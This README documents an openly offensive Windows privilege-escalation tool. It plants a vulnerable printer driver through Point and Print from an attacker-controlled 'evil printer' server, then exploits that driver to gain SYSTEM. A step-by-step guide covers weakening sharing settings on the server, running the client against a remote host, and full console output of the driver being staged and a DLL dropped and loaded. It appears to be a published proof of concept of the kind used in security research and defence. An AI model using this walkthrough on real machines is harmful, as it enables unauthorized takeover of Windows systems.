# Concealed Position

## What is this?
Concealed Position is a local privilege escalation attack against Windows using the concept of "Bring Your Own Vulnerability". Specifically, CP uses the Point and Print logic in Windows that allows a low privilege user to install printer driverss. We then exploit the installed driver to escalate to SYSTEM.

## How does it work?
Concealed Position has two parts. A server (pretending to be a printer) and a client (which will do the LPE). The client reaches out to the server, grabs a driver, gets the driver stored in the driver store, installs the printer, and exploits the install process. Easy!

## I want to add to this!
Cool! Should be pretty easy. The only hard part is that the printer driver must be packaged into a CAB file.

## How do I use this super neat tool?

Let's walk through a step by step guide.

### Server (evil printer) Usage 
To start we prepare the server. It must be a Windows box and it is assumed the attacker has admin privs on this box.

1. Copy the 3rdparty directory onto the Windows box.
2. Copy the cp_server binary (from the bin directory) onto the Windows box.
3. Copy the cab_files directory (from the Windows box) onto the Windows box.
4. From the 3rdparty directory, run converter.exe.
5. From the 3rdparty directory, run CuteWriter.exe.
6. As Administrator, run cp_server.exe. Ensure that the cab_files directory is in the same directory as cp_server.exe. The output should look like this:

```
C:\Users\albinolobster\Desktop>cp_server.exe -h
CLI options:
  -h, --help         Display the help message
  -e, --exploit arg  The exploit to use

Exploits available:
        ACIDDAMAGE
        POISONDAMAGE
        RADIANTDAMAGE

C:\Users\albinolobster\Desktop>cp_server.exe -e ACIDDAMAGE
[+] Checking CutePDF Writer is installed
[+] Staging ACIDDAMAGE files
[+] Opening CutePDF Writer registry for writing
[+] Setting PrinterDriverAttributes
[+] Setting InfPath
[+] Done.
[!] MANUAL STEPS!
[1] Set CutePDF Writer as a shared printer
[2] In Advanced Sharing Settings, Turn on file and printer sharing.
[3] In Advanced Sharing Settings, Turn off password protected sharing.
[4] Reboot

C:\Users\albinolobster\Desktop>
```

7. Set CutePDF Writer as a shared printer (Printer & Scanners -> CutePDF Writer -> Manage -> Printer Properties -> Sharing -> Share this printer)
8. Enable File and Printer sharing (Manage advanced sharing settings -> Guest or Public -> Turn on file and printer sharing)
9. Disable password protected sharing (Manage advanced sharing settings -> All Networks -> Turn off password protected sharing)
10. Reboot

### Client Usage

Client is assumed to be a low privileged user on a Windows box.

1. Copy cp_client.exe to the machine (from bin directory).
2. Provide cp_client.exe with: the evil printer to connect to (-r), the name of the evil printer (-n), and the expected driver (-e).

```
C:\Users\lowlevel\Desktop>cp_client.exe -h
 _______  _______  __    _  _______  _______  _______  ___      _______  ______
|       ||       ||  |  | ||       ||       ||   _   ||   |    |       ||      |
|       ||   _   ||   |_| ||       ||    ___||  |_|  ||   |    |    ___||  _    |
|       ||  | |  ||       ||       ||   |___ |       ||   |    |   |___ | | |   |
|      _||  |_|  ||  _    ||      _||    ___||       ||   |___ |    ___|| |_|   |
|     |_ |       || | |   ||     |_ |   |___ |   _   ||       ||   |___ |       |
|_______||_______||_|  |__||_______||_______||__| |__||_______||_______||______|
 _______  _______  _______  ___   _______  ___   _______  __    _
|       ||       ||       ||   | |       ||   | |       ||  |  | |
|    _  ||   _   ||  _____||   | |_     _||   | |   _   ||   |_| |
|   |_| ||  | |  || |_____ |   |   |   |  |   | |  | |  ||       |
|    ___||  |_|  ||_____  ||   |   |   |  |   | |  |_|  ||  _    |
|   |    |       | _____| ||   |   |   |  |   | |       || | |   |
|___|    |_______||_______||___|   |___|  |___| |_______||_|  |__|

CLI options:
  -h, --help         Display the help message
  -r, --rhost arg    The remote evil printer address
  -n, --name arg     The remote evil printer name
  -e, --exploit arg  The exploit to use

Exploits available:
        ACIDDAMAGE
        POISONDAMAGE
        RADIANTDAMAGE
C:\Users\lowlevel\Desktop>cp_client.exe -r 192.168.237.176 -n "CutePDF Writer" -e ACIDDAMAGE
 _______  _______  __    _  _______  _______  _______  ___      _______  ______
|       ||       ||  |  | ||       ||       ||   _   ||   |    |       ||      |
|       ||   _   ||   |_| ||       ||    ___||  |_|  ||   |    |    ___||  _    |
|       ||  | |  ||       ||       ||   |___ |       ||   |    |   |___ | | |   |
|      _||  |_|  ||  _    ||      _||    ___||       ||   |___ |    ___|| |_|   |
|     |_ |       || | |   ||     |_ |   |___ |   _   ||       ||   |___ |       |
|_______||_______||_|  |__||_______||_______||__| |__||_______||_______||______|
 _______  _______  _______  ___   _______  ___   _______  __    _
|       ||       ||       ||   | |       ||   | |       ||  |  | |
|    _  ||   _   ||  _____||   | |_     _||   | |   _   ||   |_| |
|   |_| ||  | |  || |_____ |   |   |   |  |   | |  | |  ||       |
|    ___||  |_|  ||_____  ||   |   |   |  |   | |  |_|  ||  _    |
|   |    |       | _____| ||   |   |   |  |   | |       || | |   |
|___|    |_______||_______||___|   |___|  |___| |_______||_|  |__|

[+] Checking if driver is already installed
[-] Driver is not available.
[+] Call back to evil printer @ \\192.168.237.176\CutePDF Writer
[+] Staging driver in driver store
[+] Driver staged!
[+] Installing the staged driver
[+] Driver installed!
[+] Starting ACIDDAMAGE
[+] Checking if C:\ProgramData\Lexmark Universal v2\ exists
[-] Target directory doesn't exist. Trigger install.
[+] Installing printer
[+] Read in C:\ProgramData\Lexmark Universal v2\Universal Color Laser.gdl
[+] Searching file contents
[+] Updating file contents
[+] Dropping updated gpl
[+] Dropping dll to disk
[+] Installing printer

C:\Users\lowlevel\Desktop>
```

3. The exploit should automatically run. On success, the "inject_me" binary is loaded with SYSTEM privileges. As this is a simple PoC it simply executes "WinExec("cmd.exe /c whoami > c:\\result.txt", SW_HIDE);"

### Other things

One thing to note is that the inject_me dll is actually embedded in the cp_client as a C array. If you update inject_me, you'll need to manually update the C array as well (just use xxd to generate the array).
